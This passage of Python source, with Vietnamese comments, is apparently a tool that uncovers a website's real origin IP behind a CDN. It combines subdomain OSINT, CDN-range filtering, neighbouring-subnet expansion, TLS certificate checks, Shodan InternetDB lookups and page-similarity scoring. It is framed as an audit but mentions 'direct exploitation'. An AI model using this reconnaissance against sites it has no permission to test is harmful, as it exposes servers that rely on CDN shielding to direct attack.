            "origin_ip": None,
            "method": "NONE",
            "confidence": 0.0,
            "candidates": [],
            "favicon_hash": None,
            "subdomains": [],
            "details": "",
        }

        all_candidate_ips = set()

        # ── Phase 1: Passive OSINT ──
        # Nguồn 1: CT Logs (crt.sh) - Hiện đang lỗi 502, sẽ tự động soft-fail
        subs_ct = self._phase1_ct_logs(domain)
        
        # Nguồn 2: HackerTarget (Dự phòng cực mạnh)
        subs_ht = self._phase1_hackertarget(domain)
        
        # Nguồn 3: AlienVault OTX
        subs_av = self._phase1_alienvault(domain)
        
        # Gộp tất cả subdomain tìm được
        subdomains = list(set(subs_ct + subs_ht + subs_av))
        result["subdomains"] = subdomains
        log.info(f"[Phase 1] Tổng hợp OSINT: Tìm thấy {len(subdomains)} subdomains duy nhất.")

        fav_hash = self._phase1_favicon_hash(domain)
        result["favicon_hash"] = fav_hash

        dns_ips = self._phase1_dns_enum(domain)
        all_candidate_ips.update(dns_ips)

        sub_ips = self._phase1_resolve_subdomains(subdomains)
        all_candidate_ips.update(sub_ips)

        log.info(f"[Phase 1 Summary] {len(all_candidate_ips)} IPs thu thập từ OSINT.")

        # ── Phase 2: CDN Filtering ──
        candidates = self._phase2_filter(list(all_candidate_ips))

        # ── Phase 3: Status Page Check ──
        leaked_ips = self._phase3_status_check(domain)
        leaked_ips.extend(self._phase3_advanced_config_audit(domain))
        self._phase3_egress_audit(domain)
        
        for ip in leaked_ips:
            if ip not in candidates and not is_cdn_ip(ip):
                candidates.append(ip)

        # ── Mở rộng subnet lân cận (±5) cho IPs từ MX/leaked ──
        expansion_seeds = leaked_ips + [ip for ip in dns_ips if not is_cdn_ip(ip)]
        expanded = set()
        for seed in expansion_seeds[:5]:  # Giới hạn 5 seeds để tránh quét quá nhiều
            for neighbor in self._expand_subnet(seed, delta=3):
                if neighbor not in candidates and not is_cdn_ip(neighbor):
                    expanded.add(neighbor)
        candidates.extend(list(expanded))
        log.info(f"[Subnet Expand] Thêm {len(expanded)} IPs lân cận vào danh sách.")

        result["candidates"] = candidates
        if not candidates:
            log.warning("[Result] Không tìm thấy Origin candidate nào sau CDN filtering.")
            result["details"] = "Không tìm thấy Origin IP candidate sau khi lọc CDN."
            return result

        # ── Lấy Reference HTML từ CDN ──
        log.info(f"[Reference] Lấy HTML gốc từ https://{domain}/ (qua CDN)")
        ref_resp = self._get(f"https://{domain}/", timeout=10)
        reference_html = ref_resp.text if ref_resp else ""

        # ── Phase 4: SNI & Certificate Check ──
        log.info(f"[Phase 4] Kiểm tra TLS Certificate trên {len(candidates)} candidates...")
        cert_matched = []
        for ip in candidates:
            sni_result = self._phase4_sni_check(ip, domain)
            if sni_result["cert_match"]:
                cert_matched.append(ip)

        # ── Phase 4.5: InternetDB Intelligence ──
        internetdb_confirmed = None
        if self._internetdb:
            log.info(f"[Phase 4.5] InternetDB lookup trên {len(candidates)} candidates...")
            for ip in cert_matched + [c for c in candidates if c not in cert_matched]:
                idb = self._internetdb.lookup(ip)
                if idb.get("error"):
                    continue
                hostname_ok = self._internetdb.hostname_matches(idb, domain)
                web_ok = self._internetdb.has_web_ports(idb)
                if hostname_ok and web_ok:
                    log.warning(
                        f"[Phase 4.5] ⚡ InternetDB XÁC NHẬN: {ip} "
                        f"có hostname khớp '{domain}' VÀ mở port web. "
                        f"→ Đang xác minh TLS SNI..."
                    )
                    internetdb_confirmed = ip
                    break
                elif hostname_ok:
                    log.info(f"[Phase 4.5] {ip}: hostname match nhưng không mở port web.")
                elif web_ok:
                    log.info(f"[Phase 4.5] {ip}: web ports open nhưng hostname không match.")

            # ── V1.0-FIX: MANDATORY TLS SNI VERIFICATION ──
            # InternetDB data may be STALE — the target could have moved
            # behind Cloudflare recently. Verify via active TLS handshake.
            if internetdb_confirmed:
                tls_status = self.verify_tls_sni(internetdb_confirmed, domain)
                if tls_status in ["VALID", "POTENTIAL_ORIGIN_UNSECURE"]:
                    result["origin_ip"] = internetdb_confirmed
                    result["method"] = "INTERNETDB_CONFIRMED + TLS_VERIFIED"
                    
                    if tls_status == "POTENTIAL_ORIGIN_UNSECURE":
                        result["confidence"] = 85.0
                        log.warning(f"[RESULT] ⚠️ ORIGIN MATCH BUT UNSECURE: {internetdb_confirmed}")
                    else:
                        result["confidence"] = 100.0
                        log.warning(f"[RESULT] 🎯 ORIGIN CONFIRMED: {internetdb_confirmed} | Method: INTERNETDB+TLS | Confidence: 100%")
                        
                    result["details"] = (
                        f"Origin IP: {internetdb_confirmed} (Confidence: {result['confidence']}%)\n"
                        f"Method: Shodan InternetDB xác nhận + TLS SNI certificate verified ({tls_status})\n"
                        f"Recommendation: Cấu hình Authenticated Origin Pulls."
                    )
                    log.info(f"{'='*60}")
                    return result
                else:
                    # TLS FAILED — InternetDB data is STALE
                    log.warning(
                        f"[Phase 4.5] ⚠️ TLS SNI FAILED for {internetdb_confirmed}: "
                        f"Certificate does NOT match '{domain}'. "
                        f"InternetDB data may be STALE. Downgrading to low confidence."
                    )
                    result["origin_ip"] = internetdb_confirmed
                    result["method"] = "INTERNETDB_STALE"
                    result["confidence"] = 40.0
                    result["details"] = (
                        f"Origin IP: {internetdb_confirmed} (Confidence: 40% — STALE)\n"
                        f"Method: InternetDB hostname match BUT TLS certificate does NOT match '{domain}'\n"
                        f"Status: STALE_OR_BLOCKED — target may have migrated behind CDN\n"
                        f"Recommendation: Verify manually with curl -H 'Host: {domain}' https://{internetdb_confirmed}"
                    )
                    result["stale_warning"] = True
                    # Do NOT return here — continue to semantic match for better candidates

        # ── Phase 5: Semantic Match ──
        log.info(f"[Phase 5] Semantic verification trên {len(candidates)} candidates...")
        best_ip = None
        best_ratio = 0.0
        best_method = "NONE"

        # Ưu tiên kiểm tra IP đã match certificate trước
        priority_list = cert_matched + [ip for ip in candidates if ip not in cert_matched]

        for ip in priority_list:
            ratio = self._phase5_semantic_match(ip, domain, reference_html)
            if ratio > best_ratio:
                best_ratio = ratio
                best_ip = ip
                if ip in cert_matched:
                    best_method = "CERT_MATCH + SEMANTIC"
                else:
                    best_method = "SEMANTIC_MATCH"

            # Nếu đã tìm được match > 0.95 thì dừng sớm
            if best_ratio > 0.95:
                break

        # ── Kết luận ──
        if best_ratio > 0.85:
            # ── V1.0-FIX: TLS SNI verification for semantic match candidates ──
            tls_status = self.verify_tls_sni(best_ip, domain)
            if tls_status in ["VALID", "POTENTIAL_ORIGIN_UNSECURE"]:
                best_method += f" + TLS_VERIFIED_{tls_status}"
                final_confidence = round(best_ratio * 100, 1)
                if tls_status == "POTENTIAL_ORIGIN_UNSECURE":
                    final_confidence = max(50.0, final_confidence - 10.0) # Penalize slightly for unsecure
            else:
                # Semantic match is good but TLS failed — downgrade but still report
                final_confidence = round(min(best_ratio * 100, 49.0), 1)
                best_method += " + TLS_FAILED"
                log.warning(
                    f"[Phase 5] ⚠️ TLS SNI verification FAILED for {best_ip}. "
                    f"Confidence capped at {final_confidence}%. Marking as STALE_OR_BLOCKED."
                )
                result["stale_warning"] = True
            
            result["origin_ip"] = best_ip
            result["method"] = best_method
            result["confidence"] = final_confidence
            tls_status_str = "TLS certificate VERIFIED" if tls_status in ["VALID", "POTENTIAL_ORIGIN_UNSECURE"] else "TLS certificate MISMATCH (STALE_OR_BLOCKED)"
            result["details"] = (
                f"Origin IP: {best_ip} (Confidence: {result['confidence']}%)\n"
                f"Method: {best_method}\n"
                f"TLS Status: {tls_status_str}\n"
                f"Recommendation: Cấu hình Authenticated Origin Pulls và Firewall ACL "
                f"chỉ cho phép traffic từ CDN."
            )
            log.warning(f"[RESULT] ⚠️ ORIGIN FOUND: {best_ip} | Method: {best_method} | Confidence: {result['confidence']}%")
        elif cert_matched:
            # ── V1.0-FIX: MANDATORY TLS SNI verification for CERT_MATCH_ONLY ──
            # Previously assigned 60% confidence without any active verification.
            # Now: TLS handshake MUST pass or result is downgraded to STALE_OSINT.
            tls_cert_status = self.verify_tls_sni(cert_matched[0], domain)
            if tls_cert_status in ["VALID", "POTENTIAL_ORIGIN_UNSECURE"]:
                result["origin_ip"] = cert_matched[0]
                result["method"] = "CERT_MATCH_ONLY + TLS_VERIFIED"
                result["confidence"] = 60.0
                result["details"] = (
                    f"Certificate match tại {cert_matched[0]} nhưng semantic ratio thấp ({best_ratio:.2%}).\n"
                    f"TLS SNI verification: PASSED ✓\n"
                    f"Có thể Origin đang chặn direct access hoặc trả nội dung khác."
                )
                log.info(f"[RESULT] Cert match tại {cert_matched[0]} + TLS verified, cần xác minh thêm.")
            else:
                # HARD DOWNGRADE: TLS failed → STALE_OSINT
                result["origin_ip"] = cert_matched[0]
                result["method"] = "CERT_MATCH_ONLY + TLS_FAILED → STALE_OSINT"
                result["confidence"] = 9.9  # Near-zero confidence
                result["stale_warning"] = True
                result["details"] = (
                    f"⚠️ STALE OSINT: Certificate matched {cert_matched[0]} but TLS SNI verification FAILED.\n"
                    f"Semantic ratio: {best_ratio:.2%} (too low).\n"
                    f"This IP may have migrated behind CDN or changed ownership.\n"
                    f"Action Required: MANUAL VERIFICATION with Shodan/Censys.\n"
                    f"DO NOT use this IP for direct exploitation — high false positive risk."
                )
                log.warning(
                    f"[RESULT] ⚠️ STALE_OSINT: {cert_matched[0]} cert match but TLS FAILED. "
                    f"Confidence hard-capped at 9.9%. Manual verification required."
                )

        else:
            result["details"] = (
                f"Không xác nhận được Origin IP.\n"
                f"Best candidate: {best_ip} (ratio: {best_ratio:.2%})\n"
                f"Cần kiểm tra thủ công với Shodan/Censys dùng favicon hash: {fav_hash}"
            )
            log.info("[RESULT] Không tìm thấy Origin IP với độ tin cậy đủ cao.")

        log.info(f"{'='*60}")
        log.info(f"[OriginAudit] Kết thúc kiểm toán cho: {domain}")
        log.info(f"{'='*60}")
        return result

    # Alias cho backward compatibility
    def audit_origin(self, domain: str) -> dict:
        return self.discover(domain)
